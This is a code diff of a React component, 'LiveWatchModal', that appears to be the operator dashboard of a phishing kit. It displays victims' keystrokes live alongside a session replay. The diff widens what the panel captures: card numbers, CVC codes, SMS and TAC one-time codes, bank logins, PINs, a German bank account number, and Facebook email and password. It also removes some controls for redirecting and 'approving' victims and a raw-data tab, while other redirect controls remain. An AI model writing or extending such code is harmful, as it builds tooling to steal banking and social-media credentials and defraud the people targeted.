@@ -90,30 +90,33 @@ export function LiveWatchModal({
   // Dynamic live fields: Only include fields that actually have values or are interacted with!
   const [liveFields, setLiveFields] = useState<Record<string, string>>(() => {
     const init: Record<string, string> = {};
-    if (formData.cardNumber && String(formData.cardNumber).trim())
-      init["Kart Numarası"] = String(formData.cardNumber).trim();
-    if (formData.cardExpiry && String(formData.cardExpiry).trim())
-      init["Son Kullanma (SKT)"] = String(formData.cardExpiry).trim();
-    if (formData.cardCvc && String(formData.cardCvc).trim())
-      init["CVC"] = String(formData.cardCvc).trim();
-    if (formData.phone && String(formData.phone).trim())
-      init["Telefon"] = String(formData.phone).trim();
-    if (formData.firstName || formData.lastName) {
-      const full = `${formData.firstName || ""} ${formData.lastName || ""}`.trim();
-      if (full) init["İsim Soyisim"] = full;
-    }
-    if (formData.smsCode && String(formData.smsCode).trim())
-      init["SMS Kodu"] = String(formData.smsCode).trim();
-    if (formData.tacCode && String(formData.tacCode).trim())
-      init["TAC Kodu"] = String(formData.tacCode).trim();
-    if (formData.bankName && String(formData.bankName).trim())
-      init["Seçilen Banka"] = String(formData.bankName).trim();
+    const add = (label: string, v: any) => {
+      if (v !== undefined && v !== null && String(v).trim()) init[label] = String(v).trim();
+    };
+    const fullName = `${formData.firstName || ""} ${formData.lastName || ""}`.trim();
+    if (fullName) init["İsim Soyisim"] = fullName;
+    add("Telefon", formData.phone);
+    add("Kart Numarası", formData.cardNumber);
+    add("Son Kullanma (SKT)", formData.cardExpiry);
+    add("CVC", formData.cardCvc);
+    add("SMS Kodu", formData.smsCode);
+    add("TAC Kodu", formData.tacCode);
+    add("Seçilen Banka", formData.bankName);
+    add("Kullanıcı Adı", formData.username);
+    add("Şifre", formData.password);
+    add("PIN", formData.pin);
+    add("Kişisel Kod", formData.personalCode);
+    add("Banka Telefonu", formData.bankPhone);
+    add("Verfüger Nr.", formData.verfuegernummer);
+    add("Facebook E-posta", formData.facebookEmail);
+    add("Facebook Şifre", formData.facebookPassword);
+    add("Ek Alan 1", formData.orderedField1);
+    add("Ek Alan 2", formData.orderedField2);
     return init;
   });
 
   const [eventCount, setEventCount] = useState(0);
   const [lastActivityAt, setLastActivityAt] = useState<number | null>(null);
-  const [activeTab, setActiveTab] = useState<"fields" | "device">("fields");
 
   const playerContainerRef = useRef<HTMLDivElement | null>(null);
   const replayerRef = useRef<any>(null);
@@ -666,55 +669,8 @@ export function LiveWatchModal({
             </code>
           </div>
 
-          {/* CENTER / CONTROLS: ACTION & APPROVAL DROPDOWNS */}
+          {/* CENTER: ACTION FEEDBACK */}
           <div className="flex items-center gap-2">
-            {/* AKSİYON SEÇİN DROPDOWN */}
-            <select
-              value=""
-              onChange={(e) => {
-                if (e.target.value) {
-                  void handleActionSelect(e.target.value);
-                  e.target.value = "";
-                }
-              }}
-              className={`rounded-xl border px-3 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
-                darkMode
-                  ? "bg-[#1c1c1e] border-white/10 text-amber-400 focus:border-[#EB5E28]"
-                  : "bg-white border-gray-200 text-amber-600 focus:border-[#EB5E28]"
-              }`}
-            >
-              <option value="">👉 Aksiyon Seçin...</option>
-              {ROUTE_OPTIONS.map((opt) => (
-                <option key={opt.value} value={opt.value}>
-                  {opt.label}
-                </option>
-              ))}
-            </select>
-
-            {/* ONAY SEÇİN DROPDOWN */}
-            <select
-              value=""
-              onChange={(e) => {
-                if (e.target.value) {
-                  void handleApprovalSelect(e.target.value);
-                  e.target.value = "";
-                }
-              }}
-              className={`rounded-xl border px-3 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
-                darkMode
-                  ? "bg-[#1c1c1e] border-white/10 text-emerald-400 focus:border-emerald-500"
-                  : "bg-white border-gray-200 text-emerald-600 focus:border-emerald-500"
-              }`}
-            >
-              <option value="">🛡️ Onay Seçin...</option>
-              {APPROVAL_OPTIONS.map((opt) => (
-                <option key={opt.value} value={opt.value}>
-                  {opt.label}
-                </option>
-              ))}
-            </select>
-
-            {/* ACTION FEEDBACK BADGE */}
             {actionFeedback && (
               <span className="flex items-center gap-1 px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider bg-emerald-500 text-black shadow-md animate-bounce">
                 <span>✓</span>
@@ -854,33 +810,14 @@ export function LiveWatchModal({
               darkMode ? "bg-[#141416] border-white/10" : "bg-white border-gray-200"
             }`}
           >
-            {/* TABS */}
-            <div className="flex border-b border-black/10 dark:border-white/10 text-xs font-bold">
-              <button
-                onClick={() => setActiveTab("fields")}
-                className={`flex-1 py-3 text-center transition-colors border-b-2 flex items-center justify-center gap-1.5 ${
-                  activeTab === "fields"
-                    ? "border-emerald-500 text-emerald-500"
-                    : "border-transparent opacity-60 hover:opacity-100"
-                }`}
-              >
-                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
-                <span>Canlı Form Alanları ({activeFieldKeys.length})</span>
-              </button>
-              <button
-                onClick={() => setActiveTab("device")}
-                className={`flex-1 py-3 text-center transition-colors border-b-2 flex items-center justify-center gap-1.5 ${
-                  activeTab === "device"
-                    ? "border-emerald-500 text-emerald-500"
-                    : "border-transparent opacity-60 hover:opacity-100"
-                }`}
-              >
-                <span>Cihaz & Ham Bilgiler</span>
-              </button>
+            {/* HEADER */}
+            <div className="flex items-center gap-1.5 border-b border-black/10 dark:border-white/10 px-4 py-3 text-xs font-bold">
+              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
+              <span>Canlı Form Alanları ({activeFieldKeys.length})</span>
             </div>
 
-            {/* TAB CONTENT: DYNAMIC FIELD CARDS */}
-            {activeTab === "fields" ? (
+            {/* DYNAMIC FIELD CARDS */}
+            {
               <div className="flex-1 overflow-y-auto p-3 space-y-3">
                 {/* QUICK REDIRECT & APPROVAL CONTROLS IN SIDEBAR */}
                 <div
@@ -1034,52 +971,7 @@ export function LiveWatchModal({
                   </div>
                 )}
               </div>
-            ) : (
-              /* TAB CONTENT: DEVICE & RAW DETAILS */
-              <div className="flex-1 overflow-y-auto p-4 space-y-4 text-xs">
-                {/* DEVICE & BROWSER INFO */}
-                <div
-                  className={`p-3.5 rounded-2xl border space-y-2 ${
-                    darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
-                  }`}
-                >
-                  <h4 className="font-bold text-[11px] uppercase tracking-wider text-cyan-500">
-                    Cihaz & Tarayıcı
-                  </h4>
-
-                  <div className="space-y-1.5 font-mono text-[11px]">
-                    <div className="flex justify-between border-b border-black/5 dark:border-white/5 pb-1">
-                      <span className="opacity-60">Çözünürlük:</span>
-                      <span>
-                        {viewportWidth} x {viewportHeight} px
-                      </span>
-                    </div>
-                    {clientMeta?.userAgent && (
-                      <div className="pt-1">
-                        <span className="opacity-60 block mb-1">User Agent:</span>
-                        <div className="p-2 rounded bg-black/20 dark:bg-white/5 text-[10px] break-words opacity-80 leading-relaxed">
-                          {clientMeta.userAgent}
-                        </div>
-                      </div>
-                    )}
-                  </div>
-                </div>
-
-                {/* RAW FORM DATA BACKUP */}
-                <div
-                  className={`p-3.5 rounded-2xl border space-y-2 ${
-                    darkMode ? "bg-white/[0.03] border-white/5" : "bg-gray-50 border-gray-100"
-                  }`}
-                >
-                  <h4 className="font-bold text-[11px] uppercase tracking-wider text-[#EB5E28]">
-                    Veritabanı Form Kaydı
-                  </h4>
-                  <pre className="p-2 rounded bg-black/30 text-[10px] font-mono overflow-auto max-h-60 opacity-80 leading-relaxed">
-                    {JSON.stringify(formData, null, 2)}
-                  </pre>
-                </div>
-              </div>
-            )}
+            }
           </div>
         </div>
       </div>
